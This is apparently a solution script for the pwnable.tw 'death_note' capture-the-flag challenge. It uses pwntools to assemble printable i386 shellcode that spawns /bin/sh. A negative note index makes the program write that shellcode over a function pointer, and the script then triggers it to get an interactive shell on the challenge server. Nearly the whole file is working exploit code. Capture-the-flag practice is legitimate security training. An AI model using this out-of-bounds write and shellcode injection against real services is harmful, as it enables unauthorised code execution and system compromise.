#!/usr/bin/env python3

from pwn import *

elf = ELF("./death_note")

context.arch = 'i386'
context.os = 'linux'

assembly_code = """
  push   0x68
	push   0x732f2f2f
	push   0x6e69622f
  push esp
  pop ebx

	push edx
  pop eax
	push 0x53
	pop edx
	sub byte ptr [eax+39],dl
	sub byte ptr [eax+40],dl
	push 0x70
	pop edx
	xor byte ptr [eax+40],dl

	push esi
	pop eax
	xor al, 0x20
	xor al, 0x2b

	push esi
	pop edx
"""


shellcode = asm(assembly_code) + b'\x20\x43'
#print(f"[*] length = {len(shellcode)}")
#print("shellcode: ")
#for i, b in enumerate(shellcode):
#	print(f"\\x{b:02x}", end="")
#print("")

#p = gdb.debug('./death_note', gdbscript='''
#	b main
#	b add_note
#	b show_note
#	b del_note
#	continue
#''')
#p = process('./death_note')
p = remote('chall.pwnable.tw', 10201)

p.sendlineafter(b'Your choice :', b'1')
p.sendlineafter(b'Index :', b'-19')
p.sendlineafter(b'Name :', shellcode)
p.sendlineafter(b'Your choice :', b'3')
p.sendlineafter(b'Index :', b'1')


p.interactive()
